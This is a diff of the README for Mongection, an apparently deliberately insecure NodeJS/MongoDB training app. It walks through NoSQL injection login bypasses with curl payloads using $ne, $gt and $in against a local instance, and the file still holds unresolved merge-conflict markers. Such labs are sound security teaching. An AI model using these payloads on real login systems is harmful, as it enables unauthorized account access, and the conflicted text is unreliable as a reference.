@@ -3,93 +3,124 @@
 
 <p align="center"><img  src="images/a1-banner.png"/></p>
 
-Mongection is a simple Nodejs web application that contains an example of a Injection vulnerability. On this example, a specific subcategory os Injection will be showed: NoSQL Injection with MongoDB.
+Mongection is a simple NodeJS web application that simulates a login page. It has both `/register` and `/login` routes that, by communicating with a MongoDB, enable users to register and enter into a generic system.
 
 ## Index
 
+<<<<<<< HEAD
 - [Definition](#what-is-nosql-injection?)
+=======
+- [Definition](#what-is-injection)
+>>>>>>> 36a1bea4720627cda761fab4d827980ea97912b0
 - [Setup](#setup)
 - [Attack narrative](#attack-narrative)
 - [Objectives](#secure-this-app)
 - [Solutions](#pr-solutions)
 - [Contributing](#contributing)
 
-## What is NoSQL Injection?
+## What is Injection?
 
-NoSQL Injection it's a vulnerability that occurs when codes / queries are injected on application's logic via unsanitized input.
+Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
 
-You can find more about this vulnerability here: https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+The main goal of this project is to discuss how **NoSQL Injection** vulnerabilities can be exploited and to encourage developers to send Pull Requests to secDevLabs on how they would mitigate these flaws.
 
 ## Setup
 
-To execute this application, you need of 2 tools on your machine:
-1. Docker
-2. docker-compose
-
-And to up the application, simply run these commands:
+To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
 
 ```sh
-
 cd secDevLabs/owasp-top10-2017-apps/a1/mongection
-
 ```
 
 ```sh
-
 make install
-
 ```
 
+Then simply visit [localhost:10001][App], as exemplified below:
+
+<img src="images/attack0.png" align="center"/>
+
+## Get to know the app 💉
+
+To properly understand how this application works, you can follow these simple steps:
+
+- Register a new user via front-end.
+- Login as this user via front-end.
+* Register another user now using command line:
+```sh
+curl -X POST http://localhost:10001/register -H "Content-Type: application/json" --data '{"name":"bob", "email":"bob@example.com", "password":"bobisboss"}'
+```
+* Login as this second user now using command line:
+```sh
+curl -X POST http://localhost:10001/login -H "Content-Type: application/json" --data '{"email":"bob@example.com", "password":"bobisboss"}'
+```
+
+<<<<<<< HEAD
 Then simply visit http://localhost:10001
+=======
+## Attack Narrative
+>>>>>>> 36a1bea4720627cda761fab4d827980ea97912b0
 
-## Get to know the app
+Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
 
-The application simulate a simple Register/Login page. When you can register a account and when you do a successful login, you email will be showed on page.
+### 👀
 
+<<<<<<< HEAD
 Accessing the application (http://localhost:10001), the homepage have 2 buttons: 1 to do Login (http://localhost:10001/login.html) and 1 to Register a new account (http://localhost:10001/register.html).😜
+=======
+#### Lack of input validation allows injection of NoSQL queries
+>>>>>>> 36a1bea4720627cda761fab4d827980ea97912b0
 
-#### Homepage
-<p  align="center"><img  src="images/attack0.png"/></p>
+After reviewing [db.js]((https://github.com/globocom/secDevLabs/blob/master/owasp-top10-2017-apps/a1/mongection/src/db.js)) file, it was possible to see that some input from users is concatenated with NoSQL queries, as shown in the following code snippets:
 
-#### Login Page
+```js
+const existUser = await User.findOne({email: email});
+```
+
+```js
+const existsUser = await User.findOne({$and: [ { email: email}, { password: password} ]});
+```
+
+As no validation is being made on these variables, injected queries may be successfully executed in MongoDB. Some directives like `$ne` or `$gt`, if successfully injected, could bypass API authentication. 
+
+#### 🔥
+
+An attacker could create a malicious query such as `{"$ne":""}` and pass it to email and password fields. Since `$ne` is the not equals condition in MongoDB, this is querying all the entries in the logins collection where both `username` and `password` are not equal to "" (empty). 
+
+Using `curl` on CLI interface, the malicious payload could be sent as shown bellow:
+
+```sh
+curl -X 'POST' 'http://localhost:10001/login' -H "Content-Type: application/json" --data '{"email": {"$ne":""}, "password": {"$ne":""}}'
+```
+
 <p  align="center"><img  src="images/attack1.png"/></p>
 
-#### Register Page
-<p  align="center"><img  src="images/attack2.png"/></p>
+The application will return the first user that MongoDB finds with a "Hello, Welcome Again!" message, demonstrating that authentication has been bypassed. There must be at least one user already registered in the database to recieve this message.
 
-
-When you create a account, you will see a message containing Hello and your email. This occurs too when you do a successful login.
-
-#### Register Message
-<p  align="center"><img  src="images/attack3.png"/></p>
-
-#### Login Message
-<p  align="center"><img  src="images/attack4.png"/></p>
-
-## Attack Narrative
-
-So, to exploit this application, you must to send a NoSQL query on email and password fields, such as: {"$ne":""}. This query tells to MongoDB that must return all results that are different of " " (null, empty).
-
-You can do this via curl and only can be exploited with this tool, simply make a request containing the NoSQL query on email and passwords fields to login endpoint:
+The same result could be reached if the attacker sent a payload using `$gt` (greater than) directive. The following query will search for entries with both `username` and `password `fields greater than "" (empty).
 
 ```sh
-curl -X 'POST' 'http://localhost:9995/login' -H "Content-Type: application/json" --data '{"email": {"$ne":""}, "password": {"$ne":""}}'
+curl -X 'POST' 'http://localhost:10001/login' -H "Content-Type: application/json" --data '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
+```
+<p  align="center"><img  src="images/attack2.png"/></p>
+
+Another possible malicious payload could use `$in` directive. The following query will iterate through every element of the given array and try each value listed for the `username` field. Also, `{"$gt":""}` will guarantee the `password` field is not evaluated.
+
+```sh
+curl -X 'POST' 'http://localhost:10001/login' -H "Content-Type: application/json" --data '{"email": {"$in":["admin@example.com", "root@example", "ana@example.com", "bob"]}, "password": {"$gt":""}}'
 ```
 
-The application will return the first user that MongoDB find, and you'll see a message containing "Hello user".
+<p  align="center"><img  src="images/attack3.png"/></p>
 
-#### Successful Login via curl
-<p  align="center"><img  src="images/attack5.png"/></p>
+## Secure this app
 
-#### Unsuccessful Login via curl
-<p  align="center"><img  src="images/attack6.png"/></p>
+How could you now mitigate this vulnerability? After your code modification, an attacker should not be able to:
 
-#### NoSQL Injection via curl
-<p  align="center"><img  src="images/attack7.png"/></p>
+* Run NoSQL queries in the database.
 
 ## PR Solutions
 
-To fix this vulnerability it's necessary to sanitize all data that will be send to back-end, a way to do this is to convert all data to string or escape special chars.  
+[Spoiler alert] To understand how this vulnerability can be mitigated, check [these pull requests](https://github.com/globocom/secDevLabs/pulls?utf8=%E2%9C%93&q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Mongection%22)!
 
 ## Contributing
 
@@ -97,5 +128,9 @@ We encourage you to contribute to SecDevLabs! Please check out the [Contributing
 
 [Docker Install]:  https://docs.docker.com/install/
 [Docker Compose Install]: https://docs.docker.com/compose/install/
+<<<<<<< HEAD
 [App]: http://localhost:10082
 [Dirb]: https://tools.kali.org/web-applications/dirb
+=======
+[App]: http://localhost:10001
+>>>>>>> 36a1bea4720627cda761fab4d827980ea97912b0
